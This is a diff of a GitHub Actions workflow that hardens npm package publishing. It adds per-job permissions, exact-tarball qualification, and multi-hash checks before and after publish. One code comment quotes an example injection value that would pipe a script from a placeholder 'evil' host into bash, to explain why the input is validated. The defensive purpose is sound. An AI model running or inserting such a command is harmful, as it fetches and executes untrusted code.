@@ -55,8 +55,6 @@ on:
 
 permissions:
   contents: read
-  packages: write # needed to publish
-  id-token: write # npm provenance
 
 concurrency:
   # Publishing is serial across packages and push events. A later version must
@@ -103,6 +101,9 @@ jobs:
   visibility:
     needs: discover
     if: ${{ github.event_name == 'workflow_dispatch' && inputs.visibility_only && !inputs.verify_only && needs.discover.outputs.packages != '[]' }}
+    permissions:
+      contents: read
+      packages: read
     runs-on: ubuntu-latest
     # REPORT-ONLY. There is no REST endpoint for changing a GitHub Packages
     # npm package's visibility — verified directly: a PATCH to
@@ -167,14 +168,75 @@ jobs:
           echo "::error title=Could not read package visibility::Neither the organization nor user package API returned ${owner}/${name}. Has it been published yet?"
           exit 1
 
-  publish:
+  fetch-published:
     needs: discover
-    if: ${{ needs.discover.outputs.packages != '[]' && (github.event_name != 'workflow_dispatch' || !inputs.visibility_only || inputs.verify_only) }}
+    if: ${{ github.event_name == 'workflow_dispatch' && inputs.verify_only && needs.discover.outputs.packages != '[]' }}
+    permissions:
+      contents: read
+      packages: read
     runs-on: ubuntu-latest
-    # A package upload or registry-artifact qualification must pass the
-    # repository's configured publish reviewers. Visibility-only changes have
-    # their own non-uploading job above and intentionally do not use it.
-    environment: npm-publish
+    strategy:
+      fail-fast: false
+      max-parallel: 1
+      matrix:
+        include: ${{ fromJSON(needs.discover.outputs.packages) }}
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          persist-credentials: false
+
+      - name: Read registry and scope from package-scope.json
+        id: scope
+        run: |
+          echo "registry=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).registry")" >> "$GITHUB_OUTPUT"
+          echo "scope=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")" >> "$GITHUB_OUTPUT"
+
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
+        with:
+          node-version: 20
+          registry-url: ${{ steps.scope.outputs.registry }}
+          scope: ${{ steps.scope.outputs.scope }}
+
+      - name: Fetch exact published tarball
+        working-directory: packages/${{ matrix.package }}
+        env:
+          NODE_AUTH_TOKEN: ${{ github.token }}
+          PKG: ${{ matrix.package }}
+        run: |
+          set -euo pipefail
+          package_name="$(node -p "require('./package.json').name")"
+          package_version="$(node -p "require('./package.json').version")"
+          destination="$RUNNER_TEMP/published/$PKG"
+          mkdir -p "$destination"
+          for attempt in 1 2 3 4 5; do
+            if output="$(npm pack "${package_name}@${package_version}" --ignore-scripts --pack-destination "$destination" 2>&1)"; then
+              printf '%s\n' "$output"
+              break
+            fi
+            printf '%s\n' "$output" >&2
+            if [ "$attempt" = 5 ]; then
+              echo "::error title=Published package unavailable::Could not fetch ${package_name}@${package_version} after 5 attempts."
+              exit 1
+            fi
+            sleep 3
+          done
+          tarball="$(find "$destination" -maxdepth 1 -type f -name '*.tgz' -print -quit)"
+          [ -n "$tarball" ] || { echo '::error title=Missing registry artifact::npm pack returned no tarball.'; exit 1; }
+          mv "$tarball" "$destination/candidate.tgz"
+
+      - name: Upload published candidate
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
+        with:
+          name: published-candidate-${{ matrix.package }}
+          path: ${{ runner.temp }}/published/${{ matrix.package }}/candidate.tgz
+          if-no-files-found: error
+
+  qualify:
+    needs: [discover, fetch-published]
+    if: ${{ always() && needs.discover.outputs.packages != '[]' && (github.event_name != 'workflow_dispatch' || !inputs.visibility_only || inputs.verify_only) && (!inputs.verify_only || needs.fetch-published.result == 'success') }}
+    permissions:
+      contents: read
+    runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       max-parallel: 1
@@ -184,36 +246,8 @@ jobs:
       - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
         with:
           fetch-depth: 0
+          persist-credentials: false
 
-      # package-scope.json is the single source of truth for which registry
-      # this repo publishes to (both packages also declare it directly via
-      # publishConfig.registry). Hardcoding registry-url below would silently
-      # break auth the moment package-scope.json points elsewhere: setup-node
-      # writes the NODE_AUTH_TOKEN auth line scoped to whatever host is passed
-      # here, so a mismatch means `npm publish` gets a token for a registry it
-      # isn't talking to and fails (or worse, talks to the wrong registry).
-      - name: Read registry and scope from package-scope.json
-        id: scope
-        run: |
-          echo "registry=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).registry")" >> "$GITHUB_OUTPUT"
-          echo "scope=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")" >> "$GITHUB_OUTPUT"
-
-      # setup-node writes a scoped registry mapping when scope is supplied.
-      # That leaves the global npm registry alone, so an ordinary dependency
-      # such as `resend` keeps resolving from npmjs during npm ci and the
-      # post-publish isolated install proof.
-      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
-        with:
-          node-version: 20
-          registry-url: ${{ steps.scope.outputs.registry }}
-          scope: ${{ steps.scope.outputs.scope }}
-
-      # matrix.package is either a version-selected package or the manual
-      # workflow_dispatch string. Every step
-      # below either passes it as a script argument or splices it into a
-      # run: script body — validate its shape once, up front, so a value like
-      # `x; curl https://evil/y|bash #` fails closed right here instead of
-      # being textually substituted into a shell command later.
       - name: Validate package input
         env:
           PKG: ${{ matrix.package }}
@@ -231,6 +265,145 @@ jobs:
           fi
           if [ "$VISIBILITY_ONLY" = true ] && [ "$VERIFY_ONLY" = true ]; then
             echo "::error title=Conflicting release modes::visibility_only and verify_only cannot both be true."
+            exit 1
+          fi
+          node scripts/check-release-catalog.mjs --package "$PKG"
+
+      - name: Install repository dependencies without lifecycle scripts
+        if: ${{ !inputs.verify_only }}
+        run: npm ci --ignore-scripts
+
+      - name: Build and run repository checks
+        if: ${{ !inputs.verify_only }}
+        run: |
+          npm run build
+          npm run check:candidate-qualification
+          npm run check:package-governance
+          npm run typecheck
+          npm test
+
+      - name: Pack one pre-publication candidate
+        if: ${{ !inputs.verify_only }}
+        working-directory: packages/${{ matrix.package }}
+        env:
+          PKG: ${{ matrix.package }}
+        run: |
+          set -euo pipefail
+          destination="$RUNNER_TEMP/qualification/$PKG"
+          mkdir -p "$destination"
+          result="$(npm pack --ignore-scripts --json --pack-destination "$destination")"
+          filename="$(node -e 'console.log(JSON.parse(process.argv[1])[0].filename)' "$result")"
+          mv "$destination/$filename" "$destination/candidate.tgz"
+
+      - name: Download published candidate for verification
+        if: ${{ inputs.verify_only }}
+        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7
+        with:
+          name: published-candidate-${{ matrix.package }}
+          path: ${{ runner.temp }}/qualification/${{ matrix.package }}/download
+
+      - name: Select exact qualification tarball
+        env:
+          PKG: ${{ matrix.package }}
+          VERIFY_ONLY: ${{ inputs.verify_only }}
+        run: |
+          set -euo pipefail
+          destination="$RUNNER_TEMP/qualification/$PKG"
+          if [ "$VERIFY_ONLY" = true ]; then
+            source="$destination/download/candidate.tgz"
+            [ -f "$source" ] || { echo '::error title=Missing published artifact::download did not contain candidate.tgz.'; exit 1; }
+            cp "$source" "$destination/candidate.tgz"
+          fi
+          [ -f "$destination/candidate.tgz" ] || { echo '::error title=Missing qualification artifact::no candidate tarball was produced.'; exit 1; }
+          sha1sum "$destination/candidate.tgz"
+          sha256sum "$destination/candidate.tgz"
+          sha512sum "$destination/candidate.tgz"
+
+      - name: Run fixed candidate qualification credential-free
+        env:
+          PKG: ${{ matrix.package }}
+          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
+          TRANSCRIPT: ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
+        run: node scripts/run-candidate-qualification.mjs --package "$PKG" --tarball "$TARBALL" --output "$TRANSCRIPT"
+
+      - name: Upload exact candidate and qualification transcript
+        if: ${{ always() }}
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
+        with:
+          name: qualified-candidate-${{ matrix.package }}
+          path: |
+            ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
+            ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
+          if-no-files-found: ignore
+
+  publish:
+    needs: [discover, qualify]
+    if: ${{ always() && needs.discover.outputs.packages != '[]' && (github.event_name != 'workflow_dispatch' || !inputs.visibility_only || inputs.verify_only) && needs.qualify.result == 'success' }}
+    permissions:
+      contents: read
+      packages: write
+      id-token: write
+    runs-on: ubuntu-latest
+    # A package upload or registry-artifact qualification must pass the
+    # repository's configured publish reviewers. Visibility-only changes have
+    # their own non-uploading job above and intentionally do not use it.
+    environment: npm-publish
+    strategy:
+      fail-fast: false
+      max-parallel: 1
+      matrix:
+        include: ${{ fromJSON(needs.discover.outputs.packages) }}
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          fetch-depth: 0
+          persist-credentials: false
+
+      - name: Download exact qualified candidate
+        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7
+        with:
+          name: qualified-candidate-${{ matrix.package }}
+          path: ${{ runner.temp }}/qualification/${{ matrix.package }}
+
+      # package-scope.json is the single source of truth for which registry
+      # this repo publishes to (both packages also declare it directly via
+      # publishConfig.registry). Hardcoding registry-url below would silently
+      # break auth the moment package-scope.json points elsewhere: setup-node
+      # writes the NODE_AUTH_TOKEN auth line scoped to whatever host is passed
+      # here, so a mismatch means `npm publish` gets a token for a registry it
+      # isn't talking to and fails (or worse, talks to the wrong registry).
+      - name: Read registry and scope from package-scope.json
+        id: scope
+        run: |
+          echo "registry=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).registry")" >> "$GITHUB_OUTPUT"
+          echo "scope=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")" >> "$GITHUB_OUTPUT"
+
+      # setup-node writes a scoped registry mapping when scope is supplied.
+      # That leaves the global npm registry alone for ordinary dependencies.
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
+        with:
+          node-version: 20
+          registry-url: ${{ steps.scope.outputs.registry }}
+          scope: ${{ steps.scope.outputs.scope }}
+
+      # matrix.package is either a version-selected package or the manual
+      # workflow_dispatch string. Every step
+      # below either passes it as a script argument or splices it into a
+      # run: script body — validate its shape once, up front, so a value like
+      # `x; curl https://evil/y|bash #` fails closed right here instead of
+      # being textually substituted into a shell command later.
+      - name: Validate package input
+        env:
+          PKG: ${{ matrix.package }}
+          VERIFY_ONLY: ${{ inputs.verify_only }}
+          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
+        run: |
+          if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
+            echo "::error title=Invalid package input::package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
+            exit 1
+          fi
+          if [ ! -f "packages/$PKG/package.json" ]; then
+            echo "::error title=Unknown package::packages/$PKG/package.json does not exist."
             exit 1
           fi
           node scripts/check-release-catalog.mjs --package "$PKG"
@@ -302,136 +475,68 @@ jobs:
             exit 1
           fi
 
-      - run: npm ci
-      # Build first. dist/ is gitignored, so a fresh checkout has none, and
-      # a package with a real internal dependency only has its .d.ts once
-      # that dependency has been compiled. Running typecheck before build
-      # works only while every package has zero internal dependencies, and
-      # silently stops working the moment one gains its first. See the
-      # matching comment in ci.yml's build job.
-      - run: npm run build
-      - name: Package lifecycle governance
-        run: npm run check:package-governance
-      - run: npm run typecheck
-      - run: npm test
-
-      # `npm pack --dry-run` further down only lists filenames — it reads no
-      # contents, so a secret or identity string baked into dist/ would sail
-      # straight past it. This packs the real tarball and scans what's
-      # inside, so it has to run after the build above produced dist/.
-      #
-      # NOTE: this pack is scan-only. It runs and is torn down entirely inside
-      # check-artifact-safety.mjs's own temp dir, so its bytes cannot be
-      # carried forward to the publish step below — that is what the
-      # "Pack tarball for publish" step further down is for.
-      - name: artifact safety (tarball)
+      - name: Artifact safety (exact qualified tarball)
         env:
           PKG: ${{ matrix.package }}
-        run: node scripts/check-artifact-safety.mjs "packages/$PKG" --require-denylist
-
-      - name: Redact denylist
-        if: always()
-        run: rm -f "$RUNNER_TEMP/denylist.json"
-
-      # Pack exactly once, for real, right after the build/scan above and
-      # before anything else touches packages/<pkg>. This is the ONE tarball
-      # that gets inspected (next step) and published (further down) — no
-      # later, separate `npm pack` invocation (implicit inside a bare
-      # `npm publish`, or a standalone `--dry-run`) can silently diverge from
-      # what was just scanned, even if a future build stops being
-      # deterministic.
-      - name: Pack tarball for publish
-        id: pack
-        working-directory: packages/${{ matrix.package }}
+          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
         run: |
           set -euo pipefail
-          # `npm pack` only guarantees the tarball filename is the LAST line of
-          # stdout (npm may print other notices above it) — same assumption
-          # scripts/check-artifact-safety.mjs makes about its own pack output.
-          tarball="$(npm pack | tail -n1)"
-          sha256="$(sha256sum "$tarball" | awk '{print $1}')"
-          echo "tarball=$tarball" >> "$GITHUB_OUTPUT"
-          echo "sha256=$sha256" >> "$GITHUB_OUTPUT"
-          echo "packed $tarball (sha256=$sha256)"
+          TARBALL_SHA1="$(sha1sum "$TARBALL" | awk '{print $1}')"
+          TARBALL_SHA256="$(sha256sum "$TARBALL" | awk '{print $1}')"
+          TARBALL_SHA512="$(sha512sum "$TARBALL" | awk '{print $1}')"
+          node scripts/check-artifact-safety.mjs "packages/$PKG" --tarball "$TARBALL" --sha1 "$TARBALL_SHA1" --sha256 "$TARBALL_SHA256" --sha512 "$TARBALL_SHA512" --require-denylist
 
       # The tarball is the thing that actually ships. Listing it is the last
       # chance to notice that `files` is letting something through. This
       # lists the CONTENTS OF THE EXACT FILE that gets published below, not a
       # separate dry-run pack.
       - name: Show tarball contents
-        working-directory: packages/${{ matrix.package }}
         env:
-          TARBALL: ${{ steps.pack.outputs.tarball }}
+          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
         run: tar tzf "$TARBALL"
 
-      # THE GATE THIS ORDERING EXISTS FOR (issue #191). Installs the exact
-      # tarball packed above into a genuinely isolated directory and imports
-      # every subpath its own `exports` field declares — the strongest proof
-      # this repository has that a package actually works for an external
-      # installer, run here for the first time BEFORE anything leaves this
-      # runner rather than after `npm publish` has already made a version
-      # permanent. Registry versions are immutable: run after publish, this
-      # check can only ever report a defect (or a false positive in the
-      # checker itself, which is exactly what happened the one time this ran
-      # in the old position — see the issue) that has already shipped and
-      # can never be un-shipped. Run here, a failure below stops the job
-      # before "Publish" ever executes: GitHub Actions skips every
-      # subsequent step once one fails, and neither Publish step below
-      # declares `if: always()` or `continue-on-error` to override that.
-      #
-      # `tarballPath` points `packRoundTrip` at the tarball "Pack tarball for
-      # publish" already produced, instead of letting it pack its own —
-      # packing a second time here would be exactly the kind of separate
-      # `npm pack` invocation that step's own comment warns can silently
-      # diverge from what was scanned and is about to be published.
-      #
-      # Skipped only for `verify_only`: that mode intentionally qualifies an
-      # ALREADY-published version, which may predate the current checkout —
-      # see "Fetch and verify published tarball" below for the matching
-      # skip and why. This step needs the current source tree to genuinely
-      # match what was just packed, which `verify_only` does not promise.
-      - name: Verify packed tarball installs and imports (pre-publish, blocks release)
+      - name: Validate qualification joins
+        env:
+          PKG: ${{ matrix.package }}
+          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
+          TRANSCRIPT: ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
+          VERIFY_ONLY: ${{ inputs.verify_only }}
+        run: |
+          if [ "$VERIFY_ONLY" = true ]; then mode=bootstrap; else mode=prepublish; fi
+          node scripts/validate-candidate-publish.mjs --package "$PKG" --tarball "$TARBALL" --transcript "$TRANSCRIPT" --mode "$mode"
+
+      - name: Redact denylist
+        if: always()
+        run: rm -f "$RUNNER_TEMP/denylist.json"
+
+      - name: Verify exact tarball is unchanged
         if: ${{ !inputs.verify_only }}
         env:
-          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          PKG: ${{ matrix.package }}
-          TARBALL: ${{ steps.pack.outputs.tarball }}
-          REGISTRY: ${{ steps.scope.outputs.registry }}
+          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
+          TRANSCRIPT: ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
         run: |
           set -euo pipefail
-          node --input-type=module <<'NODE'
-          import { readFileSync } from "node:fs";
-          import { join } from "node:path";
-          import { packRoundTrip } from "./packages/controller/dist/release/pack-round-trip.js";
+          expected_sha1="$(node -p "JSON.parse(require('fs').readFileSync(process.env.TRANSCRIPT,'utf8')).tarball.sha1")"
+          expected_sha256="$(node -p "JSON.parse(require('fs').readFileSync(process.env.TRANSCRIPT,'utf8')).tarball.sha256")"
+          expected_sha512="$(node -p "JSON.parse(require('fs').readFileSync(process.env.TRANSCRIPT,'utf8')).tarball.sha512")"
+          actual_sha1="$(sha1sum "$TARBALL" | awk '{print $1}')"
+          actual_sha256="$(sha256sum "$TARBALL" | awk '{print $1}')"
+          actual_sha512="$(sha512sum "$TARBALL" | awk '{print $1}')"
+          if [ "$actual_sha1" != "$expected_sha1" ] || [ "$actual_sha256" != "$expected_sha256" ] || [ "$actual_sha512" != "$expected_sha512" ]; then
+            echo "::error title=Tarball mismatch::The qualified candidate changed after validation. Refusing to publish."
+            exit 1
+          fi
 
-          const scope = JSON.parse(readFileSync("package-scope.json", "utf8")).scope;
-          const pkg = process.env.PKG;
-          const manifest = JSON.parse(readFileSync(`packages/${pkg}/package.json`, "utf8"));
-          const result = await packRoundTrip(`packages/${pkg}`, {
-            tarballPath: join("packages", pkg, process.env.TARBALL),
-            registry: { url: process.env.REGISTRY, authToken: process.env.NODE_AUTH_TOKEN, scope },
-            next: manifest.foundryReleaseVerification?.next,
-          });
-          if (!result.ok) {
-            for (const finding of result.findings) {
-              console.error(`[${finding.severity}] ${finding.rule}: ${finding.message}`);
-            }
-            console.error("Refusing to publish: the packed tarball does not install and import cleanly.");
-            process.exit(1);
-          }
-          console.log(`packed artifact imports: ${result.imports.map((check) => check.subpath).join(", ")}`);
-          NODE
-
-      # `npm pack` proves the files in the selected tarball, but npm's own
-      # publish path has additional validation and flag handling. A requested
-      # dry run must exercise that exact path — otherwise its name claims more
-      # than it actually verifies. It still cannot mutate the registry.
+      # The selected tarball is the thing that ships, but npm's own publish
+      # path has additional validation and flag handling. A requested dry run
+      # must exercise that exact path — otherwise its name claims more than it
+      # actually verifies. It still cannot mutate the registry.
       - name: Publish (dry run)
         if: ${{ github.event_name == 'workflow_dispatch' && inputs.dry_run && !inputs.verify_only }}
         working-directory: packages/${{ matrix.package }}
         env:
           NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          TARBALL: ${{ steps.pack.outputs.tarball }}
+          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
         # --ignore-scripts keeps this invocation identical in SHAPE to the
         # real one below. It changes nothing here on its own: measured, a
         # --dry-run publish does NOT run prepublishOnly, while a real one
@@ -460,19 +565,13 @@ jobs:
           # all — so any PAT able to publish also carries write access to every
           # repository this account can see.
           NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          TARBALL: ${{ steps.pack.outputs.tarball }}
-          EXPECTED_SHA256: ${{ steps.pack.outputs.sha256 }}
+          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
         run: |
           set -euo pipefail
-          # Belt-and-suspenders: re-hash immediately before publish and fail
-          # closed on any mismatch, even though publishing this exact file
-          # (rather than letting `npm publish` re-pack) already removes the
-          # gap this guards against.
-          actual_sha256="$(sha256sum "$TARBALL" | awk '{print $1}')"
-          if [ "$actual_sha256" != "$EXPECTED_SHA256" ]; then
-            echo "::error title=Tarball mismatch::$TARBALL sha256 changed since it was packed and scanned (expected $EXPECTED_SHA256, got $actual_sha256). Refusing to publish."
-            exit 1
-          fi
+          # The preceding exact-byte step re-hashed this artifact against the
+          # credential-free qualification transcript. Publish the same path;
+          # never ask npm to create another candidate.
+          test -f "$TARBALL"
           # --access public is a registry-protocol flag, not a visibility
           # setting on GitHub Packages — it does not make the package
           # installable without a token, and observed behaviour this repo has
@@ -501,32 +600,21 @@ jobs:
           # flag, because this flag lives here, in CI.
           npm publish "$TARBALL" --provenance --access public --ignore-scripts
 
-      # WHAT THIS STEP PROVES THAT THE PRE-PUBLISH GATE CANNOT: not whether
-      # the artifact installs and imports — "Verify packed tarball installs
-      # and imports" above already proved that, against these exact bytes,
-      # before they left this runner — but whether the CONFIGURED REGISTRY
-      # actually stored and now serves back those same bytes. Fetch the
-      # just-published version by name@version (a real, network round trip
-      # through the registry, not a local file read) and compare its sha256
-      # against the uploaded tarball. That is a distinct fact from
-      # installability, and only the registry itself can supply it.
-      - name: Fetch and verify published tarball
-        if: ${{ github.event_name == 'push' || !inputs.dry_run || inputs.verify_only }}
-        id: published
+      - name: Fetch and compare published tarball
+        if: ${{ github.event_name == 'push' || (!inputs.dry_run && !inputs.verify_only) }}
         working-directory: packages/${{ matrix.package }}
         env:
           NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          EXPECTED_SHA256: ${{ steps.pack.outputs.sha256 }}
-          VERIFY_ONLY: ${{ inputs.verify_only }}
+          EXPECTED_TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
         run: |
           set -euo pipefail
-          mkdir -p "$RUNNER_TEMP/published-tarball"
           package_name="$(node -p "require('./package.json').name")"
           package_version="$(node -p "require('./package.json').version")"
+          destination="$RUNNER_TEMP/published"
+          mkdir -p "$destination"
           for attempt in 1 2 3 4 5; do
-            if output="$(npm pack "${package_name}@${package_version}" --pack-destination "$RUNNER_TEMP/published-tarball" 2>&1)"; then
+            if output="$(npm pack "${package_name}@${package_version}" --ignore-scripts --pack-destination "$destination" 2>&1)"; then
               printf '%s\n' "$output"
-              tarball="$(printf '%s\n' "$output" | tail -n1)"
               break
             fi
             printf '%s\n' "$output" >&2
@@ -536,64 +624,16 @@ jobs:
             fi
             sleep 3
           done
-          tarball_path="$RUNNER_TEMP/published-tarball/$tarball"
-          actual_sha256="$(sha256sum "$tarball_path" | awk '{print $1}')"
-          # A verify-only run intentionally qualifies a version that may
-          # predate source-only changes in this checkout (for example its
-          # release-verification metadata). It proves the registry tarball
-          # installs and compiles; it must not claim byte identity with a
-          # freshly packed, different source tree. A publish run still fails
-          # closed unless the registry served exactly the uploaded bytes.
-          if [ "$VERIFY_ONLY" != true ] && [ "$actual_sha256" != "$EXPECTED_SHA256" ]; then
-            echo "::error title=Published tarball mismatch::$tarball sha256 differs from the uploaded artifact (expected $EXPECTED_SHA256, got $actual_sha256)."
-            exit 1
-          fi
-          echo "tarball_path=$tarball_path" >> "$GITHUB_OUTPUT"
-
-      # NOT run for an ordinary publish (push, or a manual non-dry-run
-      # dispatch): "Fetch and verify published tarball" just proved the
-      # registry served back byte-identical bytes to what "Verify packed
-      # tarball installs and imports" already checked pre-publish. Running
-      # the same install-and-import proof a second time against bytes
-      # already proven identical would check nothing new — a duplicate with
-      # no distinct purpose is noise, not an extra safety margin.
-      #
-      # `verify_only` is the one case that still needs this: it exists
-      # specifically to qualify a version ALREADY sitting in the registry —
-      # for example one published before this pre-publish gate existed, or
-      # as the "real consumer qualification" docs/PUBLISHING.md's Package
-      # visibility section asks for before an owner flips a package public —
-      # independent of whatever the current checkout happens to contain.
-      # There is no pre-publish check to have already covered that case, so
-      # this is the only place it can be proven at all.
-      - name: Install and import published tarball
-        if: ${{ inputs.verify_only }}
-        env:
-          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          PKG: ${{ matrix.package }}
-          PUBLISHED_TARBALL: ${{ steps.published.outputs.tarball_path }}
-          REGISTRY: ${{ steps.scope.outputs.registry }}
-        run: |
-          set -euo pipefail
-          node --input-type=module <<'NODE'
-          import { readFileSync } from "node:fs";
-          import { packRoundTrip } from "./packages/controller/dist/release/pack-round-trip.js";
-
-          const scope = JSON.parse(readFileSync("package-scope.json", "utf8")).scope;
-          const manifest = JSON.parse(readFileSync(`packages/${process.env.PKG}/package.json`, "utf8"));
-          const result = await packRoundTrip(`packages/${process.env.PKG}`, {
-            tarballPath: process.env.PUBLISHED_TARBALL,
-            registry: { url: process.env.REGISTRY, authToken: process.env.NODE_AUTH_TOKEN, scope },
-            next: manifest.foundryReleaseVerification?.next,
-          });
-          if (!result.ok) {
-            for (const finding of result.findings) {
-              console.error(`[${finding.severity}] ${finding.rule}: ${finding.message}`);
-            }
-            process.exit(1);
-          }
-          console.log(`published artifact imports: ${result.imports.map((check) => check.subpath).join(", ")}`);
-          NODE
+          published="$(find "$destination" -maxdepth 1 -type f -name '*.tgz' -print -quit)"
+          [ -n "$published" ] || { echo '::error title=Missing registry artifact::npm pack returned no tarball.'; exit 1; }
+          for algorithm in sha1 sha256 sha512; do
+            expected="$(${algorithm}sum "$EXPECTED_TARBALL" | awk '{print $1}')"
+            actual="$(${algorithm}sum "$published" | awk '{print $1}')"
+            if [ "$actual" != "$expected" ]; then
+              echo "::error title=Published tarball mismatch::Registry ${algorithm} differs from the uploaded candidate."
+              exit 1
+            fi
+          done
 
   # GitHub Packages defaults every newly published npm package to PRIVATE,
   # per package, regardless of this repository being public — and nothing
@@ -626,7 +666,10 @@ jobs:
   visibility-check:
     name: post-publish visibility check
     needs: [discover, publish]
-    if: ${{ needs.discover.outputs.packages != '[]' && (github.event_name == 'push' || (!inputs.dry_run && !inputs.verify_only)) }}
+    if: ${{ always() && needs.discover.outputs.packages != '[]' && (github.event_name == 'push' || (!inputs.dry_run && !inputs.verify_only)) }}
+    permissions:
+      contents: read
+      packages: read
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
